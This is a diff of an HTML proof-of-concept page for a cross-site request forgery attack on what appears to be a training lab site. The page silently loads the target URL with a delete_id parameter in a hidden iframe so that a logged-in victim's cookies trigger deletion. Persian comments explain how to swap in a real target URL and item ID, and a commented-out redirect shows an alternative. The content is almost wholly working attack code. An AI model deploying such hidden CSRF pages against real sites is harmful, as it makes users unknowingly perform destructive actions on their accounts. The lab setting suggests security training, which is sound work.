@@ -1,33 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-
-<body>
-
-<h1>This is CSRF attack</h1>
-  
-    <!doctype html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>CSRF test</title>
+    <title>CSRF PoC</title>
 </head>
 <body>
-  <h1>CSRF test page</h1>
+    <h3>Loading...</h3>
+    <!--
+        این PoC با استفاده از iframe مخفی، صفحه‌ی هدف رو با پارامتر delete_id لود می‌کنه.
+        وقتی صفحه داخل iframe لود بشه، اسکریپت خودِ صفحه (که در سورس دیدی) اجرا می‌شه
+        و چون قربانی لاگین/سشن‌دار هست، deleteTodo(id) با کوکی‌های اون اجرا می‌شه.
 
-<script>
-    document.location = "https://zv6gmy6ddk.voorivex-lab.online/?delete_id=0";
-</script>
+        نکات مهم برای شخصی‌سازی:
+        1. TARGET_URL رو با آدرس واقعی صفحه‌ی چالش عوض کن.
+        2. TODO_ID رو با شناسه‌ی موردنظر (که می‌خوای حذف بشه) عوض کن.
+    -->
+    <iframe src="https://zv6gmy6ddk.voorivex-lab.online/?delete_id=0" style="display:none;"></iframe>
 
-    
+    <!--
+        روش جایگزین (بدون iframe)، اگه بخوای مستقیم ریدایرکت کنی:
+        <script>
+            window.location = "https://TARGET_URL/?delete_id=TODO_ID";
+        </script>
+    -->
 </body>
-</html>
-
-</body>
-
 </html>
